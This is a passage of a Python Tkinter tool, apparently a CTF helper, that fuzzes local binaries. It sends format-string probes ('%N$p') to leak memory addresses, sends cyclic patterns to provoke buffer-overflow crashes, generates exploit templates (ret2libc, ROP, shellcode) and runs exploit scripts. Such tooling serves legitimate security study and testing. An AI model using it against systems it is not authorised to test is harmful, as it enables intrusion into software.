        self.interactive_text.insert(tk.END, "="*70 + "\n")
        self.interactive_text.insert(tk.END, f"{'Offset':<10} {'Leaked Address':<20} {'Type':<15} {'Notes'}\n")
        self.interactive_text.insert(tk.END, "-"*70 + "\n")
        self.interactive_text.see(tk.END)
        
        try:
            # Import pwntools locally
            try:
                import pwn
                pwn.context.log_level = 'error'  # Suppress pwntools logging
            except ImportError:
                self.log("ERROR: pwntools not installed. Install with: pip3 install pwntools")
                messagebox.showerror("Missing Dependency", "pwntools is required for advanced fuzzing.\nInstall with: pip3 install pwntools")
                return
            
            leaks = []
            
            for i in range(1, 56):
                try:
                    # Start fresh process
                    p = pwn.process(self.binary_path)
                    
                    # Replay history (send all previous inputs)
                    for step in history:
                        try:
                            # Try to receive until timeout (handle prompts)
                            p.recv(timeout=0.5)
                        except:
                            pass
                        
                        # Send the historical input
                        p.sendline(step['input'].encode() if isinstance(step['input'], str) else step['input'])
                    
                    # Now send the format string payload
                    payload = f"%{i}$p"
                    
                    try:
                        p.recv(timeout=0.5)  # Wait for prompt
                    except:
                        pass
                    
                    p.sendline(payload.encode())
                    
                    # Receive output
                    try:
                        output = p.recvall(timeout=1).decode(errors='ignore')
                    except:
                        try:
                            output = p.recv(timeout=0.5).decode(errors='ignore')
                        except:
                            output = ""
                    
                    # Close process
                    p.close()
                    
                    # Parse for leaks
                    if output:
                        import re
                        leak_pattern = r'(0x[0-9a-fA-F]{8,16})'
                        found_leaks = re.findall(leak_pattern, output)
                        
                        if found_leaks:
                            # Take the last/most relevant leak
                            leak_addr = found_leaks[-1]
                            
                            # Identify leak type
                            leak_type = self._identify_leak_type(leak_addr)
                            notes = self._get_leak_notes(leak_addr, leak_type)
                            
                            # Display in table format
                            display_line = f"{i:<10} {leak_addr:<20} {leak_type:<15} {notes}\n"
                            self.interactive_text.insert(tk.END, display_line)
                            self.interactive_text.see(tk.END)
                            
                            leaks.append((i, leak_addr, leak_type))
                    
                    # Update UI every 10 iterations
                    if i % 10 == 0:
                        self.root.update()
                
                except Exception as e:
                    # Continue even if one iteration fails
                    continue
            
            # Summary
            self.interactive_text.insert(tk.END, "="*70 + "\n")
            self.interactive_text.insert(tk.END, f"✅ Format String Fuzzing Complete\n")
            self.interactive_text.insert(tk.END, f"📊 Found {len(leaks)} leaked address(es) across {len(leaks)} offsets\n")
            self.interactive_text.insert(tk.END, "="*70 + "\n\n")
            self.interactive_text.see(tk.END)
            
            self.log(f"Format String Fuzzing Complete. Found {len(leaks)} potential leaks.")
            if leaks:
                messagebox.showinfo("Fuzzing Result", f"Found {len(leaks)} leaks!\nCheck Interactive tab for details.")

        except Exception as e:
            self.log(f"Fuzzing error: {str(e)}")
            import traceback
            traceback.print_exc()
        finally:
            self.root.after(0, lambda: self.update_status("Ready", False))

    def _fuzz_buffer_overflow(self, history):
        self.update_status("Fuzzing Buffer Overflow...", True)
        self.log("Starting Cyclic Buffer Overflow Fuzzing...")
        
        try:
            # Generate cyclic pattern
            # Start large to find crash, then maybe refine? 
            # User wants to find THE buffer overflow.
            
            crashes = []
            # lengths = [64, 128, 256, 512, 1024, 2048]
            # Actually, let's just use one large cyclic pattern to find the offset directly if it crashes
            test_length = 4096 
            pattern = cyclic(test_length)
            
            runner = BinaryRunner(self.binary_path)
            
            full_input = b""
            for step in history:
                full_input += step['input'].encode() + b"\n"
            
            full_input += pattern + b"\n"
            
            exit_code, output, error = runner.run_with_input(full_input)
            
            if exit_code < 0: # Signal (crash)
                self.log(f"Crash detected! Signal: {-exit_code}")
                self.log("Attempting to find cyclic offset...")
                
                # We can't easy get the fault address without a core dump or GDB in this simple runner.
                # However, the user asked to "find the bufferoverflow" based on segfault.
                # In a real-world scenario, we'd inspect the core dump.
                # Here, we will assume generic offset detection or just report the crash.
                
                # If we had the fault address (e.g. from dmesg or if the tool supports it), we would do:
                # offset = cyclic_find(fault_addr)
                
                # Since we don't have the fault address easily:
                self.log("Crash confirmed with 4096 bytes cyclic pattern.")
                self.log("To find exact offset, please analyze the crash in GDB or check Core Dump.")
                messagebox.showinfo("Crash Found", f"Process crashed with signal {-exit_code} using 4096 cyclic pattern.")
                
                # Assuming a crash was found, add a dummy entry to 'crashes' for the new logic
                crashes.append({'payload': f"cyclic({test_length})", 'signal': -exit_code})

                self.root.after(0, self.log, f"State-aware fuzzing complete. Found {len(crashes)} crashes.")
                if crashes:
                    self.root.after(0, messagebox.showinfo, "Fuzzing Result", f"Found {len(crashes)} crashes!\nCheck logs for details.")
                    # Optionally generate exploit from first crash
                    exploit = ExploitGenerator.generate_dynamic_exploit(
                         history, 
                         f"payload = {crashes[0]['payload']}\np.sendline(payload)",
                         initial_output=self.interactive_session.initial_output
                    )
                    self.root.after(0, lambda: self.exploit_editor.delete(1.0, tk.END))
                    self.root.after(0, lambda: self.exploit_editor.insert(tk.END, exploit))
                    self.root.after(0, lambda: self.notebook.select(self.notebook.index('end')-3)) # Switch to Exploit tab (hacky index)
            else:
                 self.log("No crash detected with 4096 bytes.")

        except Exception as e:
            self.log(f"Fuzzing error: {str(e)}")
        finally:
            self.root.after(0, lambda: self.update_status("Ready", False))

    def calculate_offset(self):
        if not self.binary_path:
            messagebox.showwarning("Warning", "Please load a binary file first!")
            return
        
        dialog = tk.Toplevel(self.root)
        dialog.title("Offset Calculation")
        dialog.geometry("400x300")
        
        tk.Label(dialog, text="Value to find:").pack(pady=10)
        value_entry = tk.Entry(dialog, width=40)
        value_entry.pack(pady=5)
        value_entry.insert(0, "0x41414141")
        
        def calculate():
            value_str = value_entry.get()
            offset = PatternGenerator.offset(value_str)
            
            result_text = scrolledtext.ScrolledText(dialog, height=10)
            result_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
            
            if offset != -1:
                result_text.insert(tk.END, f"Offset: {offset}\n")
                result_text.insert(tk.END, f"Hexadecimal: 0x{offset:x}\n")
            else:
                result_text.insert(tk.END, "Offset not found\n")
        
        tk.Button(dialog, text="Calculate", command=calculate, bg='#3498db', fg='white').pack(pady=10)
    
    def generate_exploit(self):
        exploit_type = self.exploit_type.get()
        
        # Get binary path, fallback to './target' if not loaded
        binary_path = self.binary_path if self.binary_path else './target'
        
        arch = 'x64'
        if self.analyzer and self.analyzer.info:
            arch_info = self.analyzer.info.get('architecture', {})
            arch = arch_info.get('arch', 'x64')
            if arch not in ['x64', 'x86']:
                arch = 'x64'
        
        if exploit_type == "buffer_overflow":
            exploit = ExploitGenerator.generate_buffer_overflow(112, arch, binary_path)
        elif exploit_type == "format_string":
            exploit = ExploitGenerator.generate_format_string(6, binary_path)
        elif exploit_type == "rop":
            exploit = ExploitGenerator.generate_rop_chain(arch, binary_path)
        elif exploit_type == "ret2win":
            exploit = ExploitGenerator.generate_ret2win(112, "0x401135", binary_path)
        elif exploit_type == "ret2libc":
            exploit = ExploitGenerator.generate_ret2libc(112, "0xbeef", "0xdead", "0x401100", binary_path)
        elif exploit_type == "ret2plt":
            exploit = ExploitGenerator.generate_ret2plt(112, "0x401200", binary_path)
        elif exploit_type == "srop":
            exploit = ExploitGenerator.generate_srop(112, "0x401000", binary_path)
        elif exploit_type == "shellcode":
            exploit = ExploitGenerator.generate_shellcode_injection(112, arch, binary_path)
        elif exploit_type == "ret2csu":
            exploit = ExploitGenerator.generate_ret2csu(112, arch, binary_path)
        elif exploit_type == "command_injection":
            exploit = """#!/usr/bin/env python3
print("Command injection exploit code")
print("Needs modification based on actual situation")"""
        else:
            exploit = "# Unknown exploit type"
        
        self.exploit_editor.delete(1.0, tk.END)
        self.exploit_editor.insert(tk.END, exploit)
        
        self.log(f"Generated {exploit_type} exploit code")
    def run_exploit(self):
        """Execute the exploit script from the editor."""
        if self.exploit_running:
            messagebox.showwarning("Warning", "Exploit is already running!")
            return
        
        exploit_code = self.exploit_editor.get(1.0, tk.END).strip()
        if not exploit_code:
            messagebox.showwarning("Warning", "Exploit editor is empty! Generate or write an exploit first.")
            return
        
        # Update UI state
        self.run_exploit_btn.config(state='disabled')
        self.stop_exploit_btn.config(state='normal')
        self.exploit_status_label.config(text="Running...", fg='#2ecc71')
        self.exploit_running = True
        
        # Clear previous output
        self.exploit_output.config(state='normal')
        self.exploit_output.delete(1.0, tk.END)
        self.exploit_output.insert(tk.END, "[*] Starting exploit...\\n")
        self.exploit_output.config(state='disabled')
        
        # Start execution thread
        threading.Thread(target=self._run_exploit_thread, args=(exploit_code,), daemon=True).start()
    
    def _run_exploit_thread(self, exploit_code):
        """Background thread to run the exploit."""
        try:
            # Save exploit to temp file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                temp_file = f.name
                f.write(exploit_code)
            
            self.root.after(0, self._append_exploit_output, f"[*] Exploit saved to {temp_file}\\n")
            
            # Prepare command
            cmd = ["python3", temp_file]
            
            # Add arguments if specified
            args = self.exploit_args.get().strip()
            if args:
                cmd.extend(args.split())
            
            self.root.after(0, self._append_exploit_output, f"[*] Running: {' '.join(cmd)}\\n")
            
            # Execute
            self.exploit_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
            
            # Read output line by line
            for line in iter(self.exploit_process.stdout.readline, ''):
                if not self.exploit_running:
                    break
                self.root.after(0, self._append_exploit_output, line)
            
            # Wait for completion
            return_code = self.exploit_process.wait()
            
            # Report completion
            if return_code == 0:
                self.root.after(0, self._append_exploit_output, "\\n[+] Exploit completed successfully!\\n")
                self.root.after(0, self.exploit_status_label.config, {'text': 'Completed', 'fg': '#2ecc71'})
            else:
                self.root.after(0, self._append_exploit_output, f"\\n[-] Exploit exited with code {return_code}\\n")
                self.root.after(0, self.exploit_status_label.config, {'text': 'Failed', 'fg': '#e74c3c'})
            
            # Cleanup
            try:
                os.unlink(temp_file)
            except:
                pass
                
        except Exception as e:
            self.root.after(0, self._append_exploit_output, f"\\n[!] Error: {str(e)}\\n")
            self.root.after(0, self.exploit_status_label.config, {'text': 'Error', 'fg': '#e74c3c'})
            traceback.print_exc()
        
        finally:
            self.exploit_running = False
            self.exploit_process = None
            self.root.after(0, self.run_exploit_btn.config, {'state': 'normal'})
            self.root.after(0, self.stop_exploit_btn.config, {'state': 'disabled'})
    
    def stop_exploit(self):
        """Stop the currently running exploit."""
        if self.exploit_process:
            self.exploit_running = False
            try:
                self.exploit_process.terminate()
                self.exploit_process.wait(timeout=2)
            except:
                self.exploit_process.kill()
            
            self._append_exploit_output("\\n[!] Exploit stopped by user\\n")
            self.exploit_status_label.config(text="Stopped", fg='#e67e22')
            self.run_exploit_btn.config(state='normal')
            self.stop_exploit_btn.config(state='disabled')
    
    def clear_exploit_output(self):
        """Clear the exploit output console."""
        self.exploit_output.config(state='normal')
        self.exploit_output.delete(1.0, tk.END)
        self.exploit_output.config(state='disabled')
    
    def _append_exploit_output(self, text):
        """Append text to exploit output console (GUI thread safe)."""
        self.exploit_output.config(state='normal')
        self.exploit_output.insert(tk.END, text)
        self.exploit_output.see(tk.END)
        self.exploit_output.config(state='disabled')
    
    def show_statistics(self):
        if not self.current_results:
            messagebox.showinfo("Information", "No analysis results available yet")
            return
        
        dialog = tk.Toplevel(self.root)
        dialog.title("Statistics")
        dialog.geometry("500x400")
        
        text = scrolledtext.ScrolledText(dialog, wrap=tk.WORD, font=('Consolas', 10))
        text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        stats = self.current_results
        
        output = "=" * 50 + "\n"
        output += "                   Statistics\n"
        output += "=" * 50 + "\n\n"
        
        output += f"📊 Total Vulnerabilities: {stats.get('total_vulnerabilities', 0)}\n\n"
        
        output += "By Vulnerability Type:\n"
        output += "-" * 40 + "\n"
        for vuln_type, count in stats.get('by_type', {}).items():
            output += f"{vuln_type.replace('_', ' ').title()}: {count}\n"
        
        output += "\nBy Severity:\n"
        output += "-" * 40 + "\n"
        for severity, count in stats.get('by_severity', {}).items():
            output += f"{severity.upper()}: {count}\n"
        
        text.insert(tk.END, output)
        text.config(state='disabled')
    
    def export_results(self):
        if not self.current_results and not self.analyzer:
            messagebox.showwarning("Warning", "No results to export")
            return
        
        filename = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[
                ("JSON files", "*.json"),
                ("Text files", "*.txt"),
                ("All files", "*.*")
            ]
        )
        
        if filename:
            try:
                data = {
                    'binary': self.binary_path,
                    'timestamp': datetime.now().isoformat(),
                    'analysis': self.analyzer.info if self.analyzer else {},
                    'vulnerabilities': self.current_results if self.current_results else {}
                }
                
                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump(data, f, indent=2, ensure_ascii=False)
                
                self.log(f"Results exported to: {filename}")
                messagebox.showinfo("Success", f"Results exported to:\n{filename}")
                
            except Exception as e:
                self.log(f"Export failed: {str(e)}")
                messagebox.showerror("Error", f"Export failed: {str(e)}")
    
    def export_text(self, text_widget):
        text = text_widget.get(1.0, tk.END)
        
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[
                ("Text files", "*.txt"),
                ("All files", "*.*")
            ]
        )
        
        if filename:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(text)
                
                self.log(f"Text exported to: {filename}")
                
            except Exception as e:
                self.log(f"Export failed: {str(e)}")
    
    def send_custom_input(self):
        user_input = self.input_entry.get()
        if not user_input:
            return
            
        if not hasattr(self, 'interactive_session') or not self.interactive_session or not self.interactive_session.running:
            # Fallback for old behavior or warn
            if not getattr(self, 'interactive_session', None):
                 messagebox.showwarning("Warning", "Session not running. Click Start/Reset Session.")
                 return

        self.interactive_text.insert(tk.END, f"{user_input}\n")
        self.interactive_text.see(tk.END)
        
        if self.interactive_session.send(user_input):
            self.input_entry.delete(0, tk.END)
        else:
            self.log("Failed to send input")

    def fuzz_custom_input(self):
        """Fuzz the current state by replaying history + payload"""
        if not hasattr(self, 'interactive_session') or not self.interactive_session:
             messagebox.showwarning("Warning", "No active session history to fuzz. Please start a session and interact first.")
             return

        history = list(self.interactive_session.history) # Copy history
        self.log(f"Fuzzing based on {len(history)} interaction steps...")
        
        # Ask user for fuzzing type
        fuzz_type_dialog = tk.Toplevel(self.root)
        fuzz_type_dialog.title("Select Fuzzing Type")
        fuzz_type_dialog.geometry("300x200")
        
        tk.Label(fuzz_type_dialog, text="Choose fuzzing strategy:", pady=10).pack()
        
        offset_frame = tk.Frame(fuzz_type_dialog)
        offset_frame.pack(pady=2)
        tk.Label(offset_frame, text="Max Offset:").pack(side=tk.LEFT)
        max_offset_var = tk.IntVar(value=60)
        tk.Spinbox(offset_frame, from_=5, to=500, textvariable=max_offset_var, width=5).pack(side=tk.LEFT)

        def run_format_fuzz():
            max_offset = max_offset_var.get()
            fuzz_type_dialog.destroy()
            threading.Thread(target=self._fuzz_format_string, args=(history, max_offset), daemon=True).start()
            
        def run_bof_fuzz():
            fuzz_type_dialog.destroy()
            threading.Thread(target=self._fuzz_buffer_overflow, args=(history,), daemon=True).start()

        tk.Button(fuzz_type_dialog, text="Format String (Custom Range)", command=run_format_fuzz, width=25, bg='#3498db', fg='white').pack(pady=5)
        tk.Button(fuzz_type_dialog, text="Buffer Overflow (Cyclic)", command=run_bof_fuzz, width=25, bg='#e74c3c', fg='white').pack(pady=5)

    def _classify_leak(self, val_str: str) -> str:
        """Classifies a leaked address."""
        if val_str == "(nil)":
            return "NULL"
        
        try:
            val = int(val_str, 16)
            
            # Heuristics for x64
            if 0x7f0000000000 <= val <= 0x7fffffffffff:
                return "Stack/Libc leak"
            elif 0x550000000000 <= val <= 0x56ffffffffff:
                return "PIE/Heap leak"
            elif 0x400000 <= val <= 0x409fff:
                return "Binary leak (No PIE)"
            elif val < 0x1000:
                return "Small Integer"
            else:
                return "Unknown"
        except:
            return "Raw String"

    def _fuzz_format_string(self, history, max_offset=60):
        self.update_status(f"Fuzzing Format String (1-{max_offset})...", True)
        self.log(f"Starting Format String Fuzzing (Offsets 1-{max_offset}) using Pwntools...")
        
        # Check for pwntools
        if 'pwn' not in sys.modules:
            self.log("Error: pwntools not installed. Please install it with 'pip install pwntools'")
            messagebox.showerror("Error", "Pwntools not found. Please install it.")
            self.update_status("Ready", False)
            return

        leaks_found = False
        self.interactive_text.insert(tk.END, "\n" + "="*40 + "\n")
        self.interactive_text.insert(tk.END, f"[*] FORMAT STRING FUZZING RESULTS (1-{max_offset})\n")
        self.interactive_text.insert(tk.END, "="*40 + "\n")
        self.interactive_text.see(tk.END)

        try:
            for i in range(1, max_offset + 1):
                # Use pwntools process
                p = process(self.binary_path)
                
                # Replay history
                for step in history:
                    p.sendline(step['input'].encode())
                    try: p.recv(timeout=0.05) 
                    except: pass
                
                # Payload: AAAAAAAA.%i$p to detect our own input
                payload = f"AAAAAAAA.%{i}$p"
                p.sendline(payload.encode())
                
                # Check for our marker in memory
                marker_64 = "0x4141414141414141"
                marker_32 = "0x41414141"
                
                # Read output
                try:
                    output_data = p.clean(timeout=0.5)
                    output_str = output_data.decode(errors='ignore')
                except Exception as e:
                    output_str = ""
                
                p.close()

                # Parse output
                lines = [l.strip() for l in output_str.split('\n') if l.strip()]
                
                if lines:
                    for line in reversed(lines):
                         match = re.search(r'(0x[0-9a-fA-F]+|\(nil\))', line)
                         if match:
                             val = match.group(1)
                             leak_type = self._classify_leak(val)
                             
                             # Check for User Input Marker
                             if val == marker_64 or val == marker_32:
                                 leak_type = "** USER INPUT DETECTED **"
                             
                             # Structured Clean Output
                             output_line = f"Offset {i:<2} → {leak_type:<25} → {val}\n"
                             self.interactive_text.insert(tk.END, output_line)
                             self.interactive_text.see(tk.END)
                             leaks_found = True
                             break
                
                self.root.update()
            
            if not leaks_found:
                self.interactive_text.insert(tk.END, "[-] No format string leaks detected.\n")
            
            self.interactive_text.insert(tk.END, "-"*40 + "\n\n")

        except Exception as e:
            self.log(f"Fuzzing error: {str(e)}")
            self.interactive_text.insert(tk.END, f"[!] Error: {str(e)}\n")
            traceback.print_exc()
        finally:
            self.root.after(0, lambda: self.update_status("Ready", False))

    def _fuzz_buffer_overflow(self, history):
        self.update_status("Fuzzing Buffer Overflow (Pwntools)...", True)
        self.log("Starting Cyclic Buffer Overflow Fuzzing using Pwntools...")
        
        # Check for pwntools
        if 'pwn' not in sys.modules:
             messagebox.showerror("Error", "Pwntools not found. Please install it.")
             return

        try:
            # Test sizes similar to CLI
            test_sizes = [64, 128, 256, 512, 1024, 2048, 4096]
            crash_detected = False
            
            for size in test_sizes:
                self.interactive_text.insert(tk.END, f"[*] Sending Cyclic Pattern ({size} bytes)...\n")
                self.interactive_text.see(tk.END)
                self.root.update()

                # Use pwntools process
                p = process(self.binary_path)
                
                # Replay history
                for step in history:
                    p.sendline(step['input'].encode())
                    try: p.recv(timeout=0.05)
                    except: pass
                
                # Send Payload
                pattern = cyclic(size)
                p.sendline(pattern)
                
                # Wait for response or crash
                try:
                    p.recvall(timeout=0.5)
                except:
                    pass
                
                # Check exit code
                exit_code = p.poll()
                
                if exit_code and exit_code < 0: # Signal (crash)
                    sig = -exit_code
                    if sig == signal.SIGSEGV:
                        self.interactive_text.insert(tk.END, "\n" + "-"*40 + "\n")
                        self.interactive_text.insert(tk.END, "[BUFFER OVERFLOW RESULTS]\n")
                        self.interactive_text.insert(tk.END, "Crash detected ✔\n")
                        self.interactive_text.insert(tk.END, f"Signal: {sig} (SIGSEGV)\n")
                        self.interactive_text.insert(tk.END, "-"*40 + "\n\n")
                        
                        messagebox.showinfo("Crash Found", f"Process crashed with signal {sig}!\nSize: {size}")
                        crash_detected = True
                        break
                
                p.close()
            
            if not crash_detected:
                 self.interactive_text.insert(tk.END, "\n" + "-"*40 + "\n")
                 self.interactive_text.insert(tk.END, f"No overflow detected up to {test_sizes[-1]} bytes\n")
                 self.interactive_text.insert(tk.END, "-"*40 + "\n\n")

        except Exception as e:
            self.log(f"Fuzzing error: {str(e)}")
            self.interactive_text.insert(tk.END, f"[!] Error: {str(e)}\n")
            traceback.print_exc()
        finally:
            self.root.after(0, lambda: self.update_status("Ready", False))

    def stop_fuzzing(self):
        if hasattr(self, 'fuzzer') and self.fuzzer:
            self.fuzzer.stop()
        if hasattr(self, 'intelligent_fuzzer') and self.intelligent_fuzzer:
            self.intelligent_fuzzer.stop()
        
        self.log("Fuzzing stopped")
        self.update_status("Fuzzing stopped", False)

def main():
    root = tk.Tk()
    root.title("Binary Vulnerability Scanner and Fuzzer")
    
    try:
        icon_path = os.path.join(os.path.dirname(__file__), "icon.ico")
        if os.path.exists(icon_path):
            root.iconbitmap(icon_path)
    except:
        pass
    
    app = BinaryVulnScannerGUI(root)
    root.mainloop()

if __name__ == "__main__":
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    main()
